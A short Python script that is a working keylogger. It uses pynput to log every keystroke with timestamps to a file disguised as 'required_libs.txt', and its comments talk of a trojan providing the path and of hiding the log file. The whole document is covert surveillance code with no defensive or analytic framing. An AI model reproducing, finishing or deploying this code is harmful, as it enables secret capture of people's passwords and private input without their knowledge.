from pynput import keyboard
from shutil import copyfile
import logging
import subprocess
import os
import threading

directory_log = "./" #put whatever file path we want. Maybe make it dynamic? given to us by trojan?

logging.basicConfig(filename=(directory_log + "required_libs.txt"), level=logging.DEBUG, format='%(asctime)s -> %(message)s') # %(asctime)s to add timestamps to the format
# subprocess.checkcall(["attrib", "+H", (directory_log + "required_libs.txt"])    How do we hide the text file?
#file_mover()

def on_press(key):
        logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

